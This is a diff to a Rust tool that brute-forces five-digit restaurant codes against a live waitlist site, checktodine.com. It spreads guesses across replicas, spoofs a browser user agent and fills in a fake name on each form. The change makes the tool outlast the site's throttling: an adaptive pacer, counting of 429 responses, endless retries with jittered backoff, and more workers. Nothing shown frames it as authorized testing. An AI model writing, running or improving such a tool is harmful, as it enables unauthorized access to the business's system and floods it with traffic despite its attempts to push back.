@@ -19,16 +19,14 @@ use axum::routing::get;
 use axum::Router;
 use coord::Node;
 use futures::stream::{self, StreamExt};
-use governor::{Quota, RateLimiter};
 use reqwest::Client;
 use serde::Deserialize;
 use serde_json::json;
 use std::collections::HashMap;
 use std::net::SocketAddr;
-use std::num::NonZeroU32;
-use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 const TARGET_URL: &str = "https://checktodine.com/customer_waitlist.php?businessid=110";
 /// The site's address: TARGET_URL, or DOSA_TARGET_URL instead (a test stand-in).
@@ -37,11 +35,11 @@ fn target_url() -> String {
 }
 const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
     AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
-/// Sustained request rate per replica. The site throttles bursty traffic, so we pace with a token bucket instead of
-/// raw concurrency.
+/// The most a replica asks the site per second (see Pacer: less while the site pushes back).
 const RATE_PER_SEC: u32 = 100;
-/// Tasks draining the queue (enough that the rate limiter, not their number, sets the pace).
-const BUFFER_WORKERS: usize = 16;
+/// Tasks draining the queue: enough that codes waiting out a backoff don't hold the others up (the pacer, not their
+/// number, sets the rate).
+const BUFFER_WORKERS: usize = 64;
 const INVALID_MARKER: &str = "Restaurant Code is not valid.";
 /// Exclusive upper bound for `to`: 100000 means "up to and including 99999".
 const MAX_TO: u32 = 100_000;
@@ -65,10 +63,15 @@ pub fn replica_url(id: u32) -> String {
 pub struct Counters {
     pub tried: AtomicU64,
     pub ok_200: AtomicU64,
+    pub http_429: AtomicU64,
     pub http_4xx: AtomicU64,
     pub http_5xx: AtomicU64,
     pub timeouts: AtomicU64,
     pub net_errors: AtomicU64,
+    /// Attempts made again (every error is one).
+    pub retries: AtomicU64,
+    /// Codes waiting for another attempt right now.
+    pub retrying: AtomicU64,
     pub last_error: Mutex<String>,
     pub trial_code: Mutex<String>,
     pub valid_code: Mutex<String>,
@@ -76,7 +79,7 @@ pub struct Counters {
 
 impl Counters {
     pub fn reset(&self) {
-        for c in [&self.tried, &self.ok_200, &self.http_4xx, &self.http_5xx, &self.timeouts, &self.net_errors] {
+        for c in [&self.tried, &self.ok_200, &self.http_429, &self.http_4xx, &self.http_5xx, &self.timeouts, &self.net_errors, &self.retries] {
             c.store(0, Ordering::Relaxed);
         }
         *self.last_error.lock().unwrap() = String::new();
@@ -88,9 +91,93 @@ impl Counters {
     }
 }
 
-/// POSTs one code. True iff the response body does NOT contain the invalid marker: the code was accepted. Every
-/// outcome is counted; gives up early once active goes false (found or stopped).
-pub async fn submit(client: &Client, c: &Counters, active: &AtomicBool, code: &str) -> bool {
+/// This replica's pace: at most RATE_PER_SEC, less while the site pushes back. Every attempt waits for its slot.
+/// Each second is judged by its share of errors (429, 5xx, a timeout, a dropped connection): over PUSHED_BACK, the pace
+/// is cut by 30%; under CLEAR, 5/s is added back; in between it holds. Never under MIN_RATE.
+pub struct Pacer {
+    s: Mutex<PaceState>,
+}
+
+struct PaceState {
+    next: Instant,
+    rate: f64,
+    since: Instant,
+    ok: u32,
+    bad: u32,
+}
+
+const MIN_RATE: f64 = 1.0;
+const PUSHED_BACK: f64 = 0.2;
+const CLEAR: f64 = 0.05;
+
+impl Pacer {
+    pub fn new() -> Pacer {
+        let now = Instant::now();
+        Pacer { s: Mutex::new(PaceState { next: now, rate: RATE_PER_SEC as f64, since: now, ok: 0, bad: 0 }) }
+    }
+
+    /// Waits for this attempt's slot.
+    pub async fn wait(&self) {
+        let slot = {
+            let mut s = self.s.lock().unwrap();
+            let now = Instant::now();
+            let slot = s.next.max(now);
+            s.next = slot + Duration::from_secs_f64(1.0 / s.rate);
+            slot
+        };
+        tokio::time::sleep_until(slot.into()).await;
+    }
+
+    fn note(&self, ok: bool) {
+        let mut s = self.s.lock().unwrap();
+        if ok {
+            s.ok += 1;
+        } else {
+            s.bad += 1;
+        }
+        if s.since.elapsed() >= Duration::from_secs(1) {
+            let errors = s.bad as f64 / (s.ok + s.bad) as f64;
+            if errors > PUSHED_BACK {
+                s.rate = (s.rate * 0.7).max(MIN_RATE);
+            } else if errors < CLEAR {
+                s.rate = (s.rate + 5.0).min(RATE_PER_SEC as f64);
+            }
+            s.since = Instant::now();
+            s.ok = 0;
+            s.bad = 0;
+        }
+    }
+
+    fn answered(&self) {
+        self.note(true);
+    }
+
+    fn pushed_back(&self) {
+        self.note(false);
+    }
+
+    pub fn rate(&self) -> f64 {
+        self.s.lock().unwrap().rate
+    }
+}
+
+/// The wait before the next attempt at a code: it doubles with each failure up to MAX_BACKOFF, and is a random
+/// point between half of that and all of it (full jitter's gentler cousin), so replicas that failed together don't
+/// come back together.
+const FIRST_BACKOFF: Duration = Duration::from_millis(200);
+const MAX_BACKOFF: Duration = Duration::from_secs(600);
+
+fn backoff(failures: u32) -> Duration {
+    let base = FIRST_BACKOFF.saturating_mul(1u32 << failures.min(20)).min(MAX_BACKOFF);
+    let half = base / 2;
+    half + Duration::from_millis(coord::random_u64() % (half.as_millis() as u64 + 1))
+}
+
+/// Tries one code until the site answers it: Some(true) iff the body does NOT contain the invalid marker (the code
+/// was accepted), Some(false) when it does. Anything else (an error status, a timeout, a dropped connection) is tried
+/// again after backoff(n), for as long as it takes; None only once keep() says it's no longer wanted (the scan
+/// stopped or found, or its chunk answered elsewhere). Every outcome is counted.
+pub async fn submit(client: &Client, c: &Counters, pacer: &Pacer, code: &str, keep: impl Fn() -> bool) -> Option<bool> {
     let form = [
         ("RestaurantCode", code),
         ("WaitListName", "Hari"),
@@ -100,11 +187,14 @@ pub async fn submit(client: &Client, c: &Counters, active: &AtomicBool, code: &s
         ("WaitListMessage", ""),
         ("SaveBooking", "  ＋ Add  "),
     ];
-    let mut retries: u32 = 10;
-    let mut wait_ms: u64 = 100;
-    loop {
-        if !active.load(Ordering::Relaxed) {
-            return false;
+    let mut failures: u32 = 0;
+    let result = loop {
+        if !keep() {
+            break None;
+        }
+        pacer.wait().await;
+        if !keep() {
+            break None;
         }
         match client.post(target_url()).header("User-Agent", USER_AGENT).form(&form).send().await {
             Ok(resp) => {
@@ -113,13 +203,14 @@ pub async fn submit(client: &Client, c: &Counters, active: &AtomicBool, code: &s
                     c.ok_200.fetch_add(1, Ordering::Relaxed);
                     match resp.text().await {
                         Ok(body) => {
+                            pacer.answered();
                             let success = !body.contains(INVALID_MARKER);
                             *c.trial_code.lock().unwrap() = code.to_string();
                             if success {
                                 *c.valid_code.lock().unwrap() = code.to_string();
                                 println!("Found valid code: {code}");
                             }
-                            return success;
+                            break Some(success);
                         }
                         Err(e) => {
                             c.net_errors.fetch_add(1, Ordering::Relaxed);
@@ -127,7 +218,9 @@ pub async fn submit(client: &Client, c: &Counters, active: &AtomicBool, code: &s
                         }
                     }
                 } else {
-                    if status.is_client_error() {
+                    if status.as_u16() == 429 {
+                        c.http_429.fetch_add(1, Ordering::Relaxed);
+                    } else if status.is_client_error() {
                         c.http_4xx.fetch_add(1, Ordering::Relaxed);
                     } else if status.is_server_error() {
                         c.http_5xx.fetch_add(1, Ordering::Relaxed);
@@ -146,13 +239,22 @@ pub async fn submit(client: &Client, c: &Counters, active: &AtomicBool, code: &s
                 c.error(&format!("request failed: {e}"));
             }
         }
-        if retries == 0 {
-            return false;
+        // Not answered: slower, then again after the backoff (in steps, so a stop isn't kept waiting).
+        pacer.pushed_back();
+        if failures == 0 {
+            c.retrying.fetch_add(1, Ordering::Relaxed);
         }
-        retries -= 1;
-        tokio::time::sleep(Duration::from_millis(wait_ms)).await;
-        wait_ms *= 2;
+        c.retries.fetch_add(1, Ordering::Relaxed);
+        let until = Instant::now() + backoff(failures);
+        failures += 1;
+        while Instant::now() < until && keep() {
+            tokio::time::sleep(until.saturating_duration_since(Instant::now()).min(Duration::from_secs(1))).await;
+        }
+    };
+    if failures > 0 {
+        c.retrying.fetch_sub(1, Ordering::Relaxed);
     }
+    result
 }
 
 /// Query params for a start. Both optional; omit them to scan everything. Half-open: from inclusive, to exclusive.
@@ -251,8 +353,7 @@ async fn main() {
         .user_agent(USER_AGENT)
         .build()
         .expect("build reqwest client");
-    let limiter = Arc::new(RateLimiter::direct(Quota::per_second(NonZeroU32::new(RATE_PER_SEC).unwrap())));
-    let node = Node::new(me, replica_count(), client, limiter);
+    let node = Node::new(me, replica_count(), client, Arc::new(Pacer::new()));
 
     for _ in 0..BUFFER_WORKERS {
         tokio::spawn(coord::work(node.clone()));
